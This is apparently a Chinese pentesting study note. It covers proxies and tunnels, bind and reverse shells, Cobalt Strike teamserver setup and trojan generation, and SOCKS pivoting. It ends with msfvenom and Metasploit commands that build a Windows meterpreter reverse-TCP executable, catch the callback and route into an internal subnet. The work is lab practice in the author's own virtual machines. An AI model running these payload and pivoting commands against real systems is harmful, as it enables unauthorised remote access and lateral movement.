---
categories: [渗透测试]
tags: 代理 CobaltStrike MSF
---

# 2023.10.08

## 内网代理与隧道

### 代理

解决不出网的问题，比如 A 主机在外网，B 主机在内网，这时就需要将 A 主机当作跳板去访问 B 主机。

#### 转发

端口转发，也是解决访问问题，只不过是将某一个端口转发到外网服务器上。

### 隧道

解决协议问题，比如禁用了 http 或者 tcp 协议，这时就只能使用 icmp 等一些底层协议。

> **_Question:_** 在内网渗透中，该如何选择代理方式及隧道方式？

---

### 正向马、反向马

#### 正向马（bind shell）

攻击端主动连接目标机，常用于**内网渗透**中

> **_Attention:_** 这种情况下，Kali 攻击机可以出网，但目标主机不能出网
> ![2023-10-09-11-24-07.png](https://s2.loli.net/2023/10/09/9V3HT7FCMDl4i15.png)

#### 反向马（reverse shell）

目标机主动连接攻击端，常用于目标主机在外网中，比如：一句话木马

> **_Attention:_** 这种情况下，目标机可以出网，但 kali 攻击机不能出网
> ![2023-10-09-11-26-01.png](https://s2.loli.net/2023/10/09/el4D9qRVBPAMyC1.png)

---

### Cobalt Strike 的部署及使用

hacker ----> 服务器（cs 部署在外网） ----> 受害机

```bash
# 服务器端
sudo ./teamserver '服务器IP' 'password'
# 客户端 kali linux
./start.sh # 弹出窗口后输入服务器ip地址，可修改端口，用户名，密码为服务器端启动时的password

# 客户端 windows
## 双击运行start.bat
```

### Cobalt Strike 生成 windows 木马，生成 linux 木马

> **_Note:_** 外网的环境暂时不会弄代理，现在暂时全部使用虚拟机测试使用 cs

#### Ubuntu 搭建 cs 服务端

```bash
# 更换镜像源（不知道为啥之前一直没换）
vi /etc/apt/sources.list

apt-get update
apt-get install openjdk-11-jdk

./teamserver '服务器ip' 'password'
```

<details> <summary>镜像源文件内容</summary>
<pre><code class="language-bash">
# 镜像源文件内容
# 默认注释了源码镜像以提高 apt update 速度，如有需要可自行取消注释
deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu-ports/ jammy main restricted universe multiverse
# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu-ports/ jammy main restricted universe multiverse
deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu-ports/ jammy-updates main restricted universe multiverse
# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu-ports/ jammy-updates main restricted universe multiverse
deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu-ports/ jammy-backports main restricted universe multiverse
# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu-ports/ jammy-backports main restricted universe multiverse
deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu-ports/ jammy-security main restricted universe multiverse
# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu-ports/ jammy-security main restricted universe multiverse
# 预发布软件源，不建议启用
# deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu-ports/ jammy-proposed main restricted universe multiverse
# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu-ports/ jammy-proposed main restricted universe multiverse
</code></pre>
</details>

#### kali linux 搭建 cs 客户端

1. 输入服务端相关信息登入客户端界面
2. 使用下图的方式生成一个 exe 木马
   ![image.png](https://s2.loli.net/2023/10/09/9qzFV6jvOUkrIte.png)
3. 将木马复制到 windows 机器中，双击执行
4. 成功上线
   ![2023-10-09-16-12-26.png](https://s2.loli.net/2023/10/09/pIcQhf4CkJ5z98s.png)

#### CobaltStrike&SOCKS代理使用
> **_Note:_**为什么使用SOCKS代理？
>  
> 方便进行内网渗透，访问内网服务。

hacker ----> web机器 ----> 内网服务机器

##### Proxifier
Proxifier是一款全局代理客户端，它可以让应用程序通过代理服务器连接到互联网。

1. 在ubuntu开启cs服务端，kali开启cs客户端后，对win11会话进行代理转发，设置SOCKS4a代理，端口为29064。
2. 开启Proxifier客户端，新建一个SOCKS4a代理，服务器ip为ubuntu的ip地址，即10.211.55.5，端口为刚刚开启代理转发的端口，即29064。
3. 如果这个win11机器本身是不出网的，无法访问，那么没有设置proxifier规则的浏览器是无法访问这个机器的；但是如果添加了代理转发规则，这个浏览器就可以访问这个本来不出网的机器了。这是因为，proxifie将请求转发给了cs（10.211.55.5:29064）这个代理服务器，代理服务器将这个请求转发给了这台不出网机器，从而在这二者之间建立起了连接，不出网机器也可以将响应返回给客户端。

### Metasploit 生成 windows 正向反向木马，Linux 正向反向木马
#### msf生成反向x86马
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.86.137 LPORT=2323 -f exe > shell.exe

msfconsole
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp # 这里替换为生成使用的payload
set LHOST your-IP # msf所在机器的ip
set LPORT your-port # 连接的端口
exploit

show options # 查看配置

# 添加路由
run post/multi/manage/autoroute
# 查看路由
run autoroute -p
# 添加指定路由，1是接收的session编号
route add 192.168.11.0 255.255.255.0 1
# 查看路由表
route print

# 设置SOCKS代理
use auxiliary/server/socks_proxy
set srvhost 0.0.0.0
```
